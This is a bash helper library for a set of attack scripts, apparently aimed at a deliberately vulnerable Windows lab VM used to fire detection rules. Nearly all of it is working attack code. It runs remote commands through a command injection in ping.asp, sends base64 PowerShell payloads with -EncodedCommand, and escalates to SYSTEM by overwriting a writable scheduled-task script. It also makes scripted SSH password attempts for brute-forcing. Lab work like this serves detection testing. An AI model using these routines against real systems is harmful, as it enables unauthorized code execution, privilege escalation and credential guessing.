#!/usr/bin/env bash
# Shared helpers for the vm/attacks-win scripts — source it, don't execute.
#
# TARGET    monitored host (default: the Windows Vagrant private-network IP)
# HOST_IP   the attacker machine as the target sees it (default: the host
#           end of the VirtualBox host-only network)

TARGET="${TARGET:-192.168.56.20}"
HOST_IP="${HOST_IP:-192.168.56.1}"

say()  { printf '\n\033[1;36m==>\033[0m %s\n' "$*"; }
note() { printf '    \033[2m%s\033[0m\n' "$*"; }
die()  { printf '\033[1;31merror:\033[0m %s\n' "$*" >&2; exit 1; }

need() { command -v "$1" >/dev/null 2>&1 || die "$1 not found on the attacker box ($2)"; }

check_target() {
  curl -sf -m 5 "http://$TARGET/ping.asp?ip=127.0.0.1" >/dev/null ||
    die "cannot reach http://$TARGET/ping.asp — is win01 up? (override with TARGET=ip)"
}

# strip — drop the <pre></pre> wrapper ping.asp puts around command output.
strip() { sed -e 's/<pre>//' -e 's|</pre>||'; }

# rce CMD — run CMD on the target via the ping.asp injection. POST so
# EncodedCommand payloads are not truncated by IIS's query-string limit.
rce() {
  # No -f: IIS can return 500 after the command already ran (AV, start /b).
  curl -s -m 120 "http://$TARGET/ping.asp" --data-urlencode "ip=127.0.0.1 & $1"
}

# ps_enc TEXT — UTF-16LE base64 for powershell -EncodedCommand.
ps_enc() {
  python3 -c 'import sys,base64; print(base64.b64encode(sys.argv[1].encode("utf-16le")).decode())' "$1"
}

# rce_ps PS — run a PowerShell snippet via -EncodedCommand (avoids quoting
# hell through cmd.exe, and fires the ps-enc rule).
rce_ps() {
  rce "powershell -nop -enc $(ps_enc "$1")"
}

# root CMD — run CMD as SYSTEM via the writable BackupSvc task. CMD is a
# cmd.exe one-liner with no single quotes; stdout lands in root.out.
root() {
  rce_ps "Set-Content -Path 'C:\\BackupSvc\\backup.bat' -Encoding ASCII -Value '$1 >C:\\BackupSvc\\root.out 2>&1'"
  rce "schtasks /run /tn BackupSvc" >/dev/null || true
  sleep 2
  rce "type C:\\BackupSvc\\root.out"
}

# root_ps PS — like root, but PS is a PowerShell snippet (quoted however
# you like; it is EncodedCommand'd into the service script).
root_ps() {
  local enc
  enc=$(ps_enc "$1")
  rce_ps "Set-Content -Path 'C:\\BackupSvc\\backup.bat' -Encoding ASCII -Value 'powershell -nop -enc $enc >C:\\BackupSvc\\root.out 2>&1'"
  rce "schtasks /run /tn BackupSvc" >/dev/null || true
  sleep 2
  rce "type C:\\BackupSvc\\root.out"
}

# ssh_try USER PASS CMD — attempt one SSH password login. Prints command
# output and returns 0 on success; silent and nonzero on bad credentials.
# The remote command is passed via the environment so Expect/Tcl does not
# reinterpret backslashes (C:\Users would otherwise become a unicode escape).
ssh_try() {
  local out
  if command -v sshpass >/dev/null 2>&1; then
    if out=$(sshpass -p "$2" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
      -o PubkeyAuthentication=no -o PreferredAuthentications=password \
      "$1@$TARGET" "$3" 2>&1); then
      printf '%s\n' "$out"
      return 0
    fi
    return 1
  fi
  command -v expect >/dev/null 2>&1 ||
    die "the attacker box needs sshpass or expect for the brute-force / SSH stages"
  if out=$(EXPECT_USER="$1" EXPECT_PASS="$2" EXPECT_HOST="$TARGET" EXPECT_CMD="$3" expect <<'EOF'
set timeout 20
spawn ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no $env(EXPECT_USER)@$env(EXPECT_HOST) "$env(EXPECT_CMD)"
expect {
  -re "(?i)password:" { send "$env(EXPECT_PASS)\r"; exp_continue }
  eof
}
if {[catch wait result]} { exit 0 }
if {[llength $result] < 4} { exit 0 }
exit [lindex $result 3]
EOF
); then
    printf '%s\n' "$out" | grep -v '^spawn ssh' || true
    return 0
  fi
  return 1
}
